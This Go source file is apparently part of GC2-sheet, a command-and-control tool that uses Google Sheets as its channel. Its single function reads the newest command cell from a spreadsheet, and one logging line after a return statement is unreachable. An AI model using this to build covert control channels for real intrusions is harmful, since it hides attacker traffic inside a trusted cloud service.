package C2

import (
	"GC2-sheet/internal/configuration"
	"GC2-sheet/internal/utils"
	"fmt"
	"google.golang.org/api/sheets/v4"
	"strconv"
)

func readSheet(client *sheets.Service, spreadSheet *configuration.SpreadSheet) string {

	spreadsheetId := spreadSheet.SpreadSheetId

	sheetName := spreadSheet.CommandSheet.Name

	rangeCell := utils.GetLastCommand(spreadSheet).RangeIn
	rangeId := strconv.Itoa(utils.GetLastCommand(spreadSheet).RangeId)
	// Example: Sheet1!A2
	readRange := sheetName + rangeCell + rangeId

	resp, err := client.Spreadsheets.Values.Get(spreadsheetId, readRange).Do()
	if err != nil {
		utils.LogDebug("Unable to retrieve data from sheet: " + err.Error())
		return ""
	}

	if len(resp.Values) == 0 {
		return ""
		utils.LogDebug("No data found.")
	} else {

		// Get result
		row := resp.Values[0]
		var result string
		result =  fmt.Sprintf("%v", row[0])
		return result

	}

	return ""
}
